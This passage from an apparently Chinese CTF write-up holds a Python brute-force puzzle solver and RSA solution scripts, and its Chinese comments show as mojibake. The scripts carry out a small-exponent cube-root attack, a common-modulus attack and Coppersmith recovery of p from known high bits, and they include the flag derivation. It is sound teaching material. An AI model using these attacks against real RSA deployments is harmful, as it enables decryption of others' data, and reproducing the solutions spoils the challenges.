i5<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i1 <span class="token operator">>=</span> i2<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">>=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">>=</span> i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number ä¼šæ£€æŸ¥</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>æœ€å md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#ä½è§£å¯†æŒ‡æ•°æ”»å‡»</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#å…±æ¨¡æ”»å‡»</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#å·²çŸ¥é«˜ä½pæ”»å‡»</span><span class="token triple-quoted-string string">"""å·²çŸ¥é«˜ä½pï¼Œåˆ©ç”¨ç½‘ä¸Šçš„sageè„šæœ¬ï¼Œè·å–pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°çš„16è¿›åˆ¶è½¬md5å³ä¸ºflagå€¼ï¼š</p><img 